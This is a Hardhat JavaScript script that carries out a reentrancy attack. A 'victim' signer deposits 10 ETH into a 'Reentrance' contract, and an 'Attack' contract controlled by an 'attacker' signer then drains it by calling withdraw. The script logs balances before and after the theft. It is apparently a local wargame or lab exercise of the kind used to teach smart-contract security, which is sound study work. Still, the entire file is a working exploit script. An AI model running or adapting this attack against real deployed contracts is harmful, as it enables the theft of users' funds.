const hre = require('hardhat');

async function main() {
  const [owner, attacker, victim] = await ethers.getSigners();
  const provider = ethers.provider;

  const reentrance = await ethers.getContractAt(
    'Reentrance',
    process.env.REENTRANCE_ADDRESS
  );
  const attack = await ethers.getContractAt(
    'Attack',
    process.env.ATTACK_ADDRESS
  );

  await (
    await reentrance.connect(victim).donate(victim.address, {
      value: ethers.utils.parseEther('10'),
    })
  ).wait();

  await (
    await reentrance.connect(attacker).donate(attack.address, {
      value: ethers.utils.parseEther('1'),
    })
  ).wait();

  await (
    await attacker.sendTransaction({
      to: attack.address,
    })
  ).wait();

  console.log(
    `Attacker balance before :>> ${ethers.utils.formatEther(
      (await provider.getBalance(attacker.address)).toString(),
      '1'
    )}`
  );

  await (await attack.connect(attacker).withdraw()).wait();

  console.log(
    `Reentrance Contract balance :>> ${ethers.utils.formatEther(
      (await provider.getBalance(reentrance.address)).toString()
    )}`
  );
  console.log(
    `Attack Contract balance :>> ${ethers.utils.formatEther(
      (await provider.getBalance(attack.address)).toString()
    )}`
  );
  console.log(
    `Attacker balance after :>> ${ethers.utils.formatEther(
      (await provider.getBalance(attacker.address)).toString()
    )}`
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
